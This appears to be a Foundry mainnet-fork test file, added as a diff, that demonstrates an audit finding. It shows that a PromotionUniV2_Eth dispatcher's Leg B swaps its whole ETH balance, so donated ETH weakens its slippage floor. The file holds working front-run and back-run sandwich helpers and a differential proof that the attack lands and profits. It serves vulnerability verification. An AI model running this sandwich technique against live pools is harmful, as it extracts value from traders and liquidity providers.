@@ -1,0 +1,235 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// =============================================================================
+// run-19 T5 — CODE-007 / run-17 L-13
+//
+// CLAIM: `PromotionUniV2_Eth._legB` swaps `address(this).balance` rather than the
+//        ETH the preceding `swapExactTokensForETH` actually produced, so the
+//        caller-supplied `minPromoOut` floor stops bounding that swap.
+//
+// This is a MAINNET-FORK test against live UniV2 / Sky PSM / sUSDS / Balancer V3
+// liquidity — no mocked AMM. Anti-vacuity: every assertion is preceded by a
+// tripwire proving the leg really executed (non-zero swap amounts, non-zero
+// promo received, ETH balance actually consumed), and the decisive test is a
+// DIFFERENTIAL: the identical sandwich + identical floor REVERTS without stray
+// ETH and SUCCEEDS with it. A no-op run cannot produce that pair of outcomes.
+// =============================================================================
+
+import {Test} from "forge-std/Test.sol";
+import {PromotionUniV2_Eth} from "../src/dispatchers/PromotionUniV2_Eth.sol";
+import {IUniswapV2Router02} from "../src/interfaces/uniswap/IUniswapV2Router02.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+
+interface IUniV2Quoter {
+    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+contract Run19PromoToken is ERC20 {
+    constructor() ERC20("Promo", "PROMO") {}
+
+    function mint(address to, uint256 amount) external {
+        _mint(to, amount);
+    }
+}
+
+contract Run19_T5_LegBUnboundedEth is Test {
+    using SafeERC20 for IERC20;
+
+    address internal constant phUSD = 0xf3B5B661b92B75C71fA5Aba8Fd95D7514A9CD605;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+
+    uint256 internal constant FORK_BLOCK = 25_550_000;
+    uint256 internal constant AMOUNT_IN = 1_000e6; // 1,000 USDC pooled
+
+    PromotionUniV2_Eth internal disp;
+    Run19PromoToken internal promo;
+    address internal pair;
+    address internal griefer = address(0x6217);
+    address internal sandwicher = address(0x5A4D);
+
+    function setUp() public {
+        string memory rpc = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
+        vm.createSelectFork(rpc, FORK_BLOCK);
+
+        promo = new Run19PromoToken();
+        _seedPair(phUSD, 100_000e18, address(promo), 100_000e18);
+        pair = IUniswapV2Factory(UNIV2_FACTORY).getPair(phUSD, address(promo));
+        require(pair != address(0), "pair not created");
+
+        disp = new PromotionUniV2_Eth(address(promo), pair, address(this));
+        disp.setAuthorizedPooler(address(this), true);
+
+        // ETH -> promo route. Deliberately a MODEST pool so slippage is measurable —
+        // this is the leg whose floor is under test.
+        _seedPair(WETH, 100e18, address(promo), 300_000e18);
+    }
+
+    // -------------------------------------------------------------------------
+    // T5a — the raw property: the swapped ETH is the BALANCE, not the leg output.
+    // -------------------------------------------------------------------------
+    function test_T5a_legBSwapsWholeBalanceNotLegOutput() public {
+        deal(USDC, address(disp), AMOUNT_IN);
+
+        uint256 legEth = _quoteLegEth(AMOUNT_IN);
+        assertGt(legEth, 0, "TRIPWIRE: the USDC->ETH leg must really produce ETH");
+
+        // A third party (or a stale residual from an earlier partial pool()) leaves
+        // ETH on the open `receive()`. 10x the leg's own output.
+        // NOTE: a freshly-CREATEd address on this fork already carries a 1 wei
+        // dust balance, so the baseline is taken rather than assumed to be zero.
+        uint256 baseline = address(disp).balance;
+        uint256 stray = legEth * 10;
+        vm.deal(griefer, stray);
+        vm.prank(griefer);
+        (bool ok,) = address(disp).call{value: stray}("");
+        assertTrue(ok, "TRIPWIRE: receive() really is open to anyone");
+        assertEq(address(disp).balance, baseline + stray, "TRIPWIRE: stray ETH resident before pool()");
+
+        disp.pool(AMOUNT_IN, 0, 0, 0, 0, 0);
+
+        // The whole balance was consumed: leg output AND the stray donation.
+        assertEq(address(disp).balance, 0, "the ENTIRE ETH balance was swapped, not just the leg output");
+
+        emit log_named_uint("T5a leg-produced ETH (wei)", legEth);
+        emit log_named_uint("T5a stray ETH swapped alongside it (wei)", stray);
+        emit log_named_uint("T5a total ETH consumed by Leg B (wei)", legEth + stray + baseline);
+        emit log_named_uint("T5a floor dilution factor x100", ((legEth + stray) * 100) / legEth);
+    }
+
+    // -------------------------------------------------------------------------
+    // T5b — THE DECISIVE DIFFERENTIAL. Same amountIn, same sandwich, same
+    //       `minPromoOut` calibrated off-chain for the 30%-leg ETH.
+    //       Without stray ETH: the floor BITES and pool() reverts (protection works).
+    //       With stray ETH:    the identical sandwich passes the floor and lands.
+    // -------------------------------------------------------------------------
+    function test_T5b_floorBitesWithoutStrayEth() public {
+        uint256 floor = _calibratedFloor(AMOUNT_IN);
+        uint256 sandwichEth = 12 ether;
+
+        deal(USDC, address(disp), AMOUNT_IN);
+        uint256 attackerPromo = _frontRun(sandwichEth);
+        assertGt(attackerPromo, 0, "TRIPWIRE: the front-run really executed");
+
+        vm.expectRevert(bytes("UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT"));
+        disp.pool(AMOUNT_IN, 0, 0, floor, 0, 0);
+
+        emit log_named_uint("T5b calibrated minPromoOut", floor);
+        emit log_named_uint("T5b sandwich size (wei ETH)", sandwichEth);
+        emit log_string("T5b: with NO stray ETH the floor correctly rejects the sandwiched trade");
+    }
+
+    function test_T5c_sameSandwichSucceedsOnceStrayEthDilutesTheFloor() public {
+        uint256 floor = _calibratedFloor(AMOUNT_IN);
+        uint256 sandwichEth = 12 ether;
+
+        deal(USDC, address(disp), AMOUNT_IN);
+
+        // Residual / donated ETH — no attacker action required for the stale-residual case.
+        uint256 legEth = _quoteLegEth(AMOUNT_IN);
+        uint256 stray = legEth * 10;
+        vm.deal(griefer, stray);
+        vm.prank(griefer);
+        (bool ok,) = address(disp).call{value: stray}("");
+        assertTrue(ok, "TRIPWIRE: stray ETH landed");
+
+        uint256 attackerPromo = _frontRun(sandwichEth);
+        assertGt(attackerPromo, 0, "TRIPWIRE: the front-run really executed");
+
+        uint256 promoOnDispBefore = promo.balanceOf(address(disp));
+
+        // IDENTICAL floor, IDENTICAL sandwich — now it goes through.
+        disp.pool(AMOUNT_IN, 0, 0, floor, 0, 0);
+
+        assertEq(address(disp).balance, 0, "TRIPWIRE: Leg B really ran and swept all ETH");
+        assertGt(promo.balanceOf(address(disp)) + IERC20(pair).balanceOf(address(disp)), promoOnDispBefore,
+            "TRIPWIRE: promo really was acquired");
+
+        uint256 attackerEthOut = _backRun(attackerPromo);
+        emit log_named_uint("T5c calibrated minPromoOut (unchanged)", floor);
+        emit log_named_uint("T5c stray ETH resident before pool (wei)", stray);
+        emit log_named_uint("T5c sandwicher ETH in (wei)", sandwichEth);
+        emit log_named_uint("T5c sandwicher ETH out (wei)", attackerEthOut);
+        if (attackerEthOut > sandwichEth) {
+            emit log_named_uint("T5c sandwicher PROFIT (wei)", attackerEthOut - sandwichEth);
+        } else {
+            emit log_named_uint("T5c sandwicher loss (wei)", sandwichEth - attackerEthOut);
+        }
+        emit log_string("T5c: the SAME sandwich the floor rejected in T5b now clears it");
+    }
+
+    // -------------------------------------------------------------------------
+    // helpers
+    // -------------------------------------------------------------------------
+
+    /// @dev ETH the 30% leg alone would produce, at current fork state.
+    function _quoteLegEth(uint256 amountIn) internal view returns (uint256) {
+        address[] memory p = new address[](2);
+        p[0] = USDC;
+        p[1] = WETH;
+        uint256[] memory out = IUniV2Quoter(UNIV2_ROUTER).getAmountsOut((amountIn * 30) / 100, p);
+        return out[1];
+    }
+
+    /// @dev The floor an honest pooler computes off-chain: promo expected for the
+    ///      leg's OWN ETH, with 1% slippage tolerance.
+    function _calibratedFloor(uint256 amountIn) internal view returns (uint256) {
+        uint256 legEth = _quoteLegEth(amountIn);
+        address[] memory p = new address[](2);
+        p[0] = WETH;
+        p[1] = address(promo);
+        uint256[] memory out = IUniV2Quoter(UNIV2_ROUTER).getAmountsOut(legEth, p);
+        return (out[1] * 99) / 100;
+    }
+
+    function _frontRun(uint256 ethIn) internal returns (uint256 promoOut) {
+        address[] memory p = new address[](2);
+        p[0] = WETH;
+        p[1] = address(promo);
+        vm.deal(sandwicher, ethIn);
+        vm.prank(sandwicher);
+        uint256[] memory amounts = IUniswapV2Router02(UNIV2_ROUTER).swapExactETHForTokens{value: ethIn}(
+            0, p, sandwicher, block.timestamp
+        );
+        promoOut = amounts[amounts.length - 1];
+    }
+
+    function _backRun(uint256 promoIn) internal returns (uint256 ethOut) {
+        address[] memory p = new address[](2);
+        p[0] = address(promo);
+        p[1] = WETH;
+        vm.startPrank(sandwicher);
+        IERC20(address(promo)).forceApprove(UNIV2_ROUTER, promoIn);
+        uint256 before = sandwicher.balance;
+        IUniswapV2Router02(UNIV2_ROUTER).swapExactTokensForETH(promoIn, 0, p, sandwicher, block.timestamp);
+        ethOut = sandwicher.balance - before;
+        vm.stopPrank();
+    }
+
+    function _seedPair(address tokenA, uint256 amtA, address tokenB, uint256 amtB) internal {
+        _provide(tokenA, amtA);
+        _provide(tokenB, amtB);
+        IERC20(tokenA).forceApprove(UNIV2_ROUTER, amtA);
+        IERC20(tokenB).forceApprove(UNIV2_ROUTER, amtB);
+        IUniswapV2Router02(UNIV2_ROUTER).addLiquidity(tokenA, tokenB, amtA, amtB, 0, 0, address(this), block.timestamp);
+    }
+
+    function _provide(address token, uint256 amount) internal {
+        if (token == address(promo)) {
+            promo.mint(address(this), amount);
+        } else {
+            deal(token, address(this), amount);
+        }
+    }
+
+    receive() external payable {}
+}
